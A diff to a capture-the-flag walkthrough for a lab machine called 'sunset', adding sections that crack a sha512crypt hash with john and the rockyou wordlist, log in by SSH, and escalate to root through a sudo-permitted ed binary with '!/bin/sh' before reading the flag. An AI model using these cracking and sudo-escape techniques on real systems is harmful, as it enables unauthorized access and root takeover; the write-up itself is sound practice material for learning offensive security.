@@ -83,7 +83,9 @@ Analyzing '$6$$3QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7
 [+] SHA-512 Crypt [Hashcat Mode: 1800][JtR Format: sha512crypt]
 ```
 
-just use `john` to crack the password :
+## 2.Gaining Shell
+
+Just use `john` to crack the password :
 
 ```bash
 root@kali: john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt user.txt 
@@ -98,3 +100,51 @@ cheer14          (sunset)
 sky              (sky)  
 ```
 
+
+try different users, but you can only login with user `sunset` :
+
+```bash
+root@kali: ssh sunset@192.168.56.119
+sunset@192.168.56.119's password: 
+Linux sunset 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Jul 28 20:52:38 2019 from 192.168.1.182
+
+sunset@sunset:~$ id
+uid=1000(sunset) gid=1000(sunset) groups=1000(sunset),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)
+```
+
+## 3.Privilege Escalation
+
+Check sudo permissions on this user :
+
+```bash
+sunset@sunset:~$ sudo -l
+Matching Defaults entries for sunset on sunset:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User sunset may run the following commands on sunset:
+    (root) NOPASSWD: /usr/bin/ed
+```
+
+so we can only run `ed` binary with no password :
+
+```bash
+unset@sunset:~$ sudo /usr/bin/ed
+id
+?
+!/bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+# cd /root
+
+# cat flag.txt
+25d7ce0ee3cbf71efbac61f85d0c14fe
+```
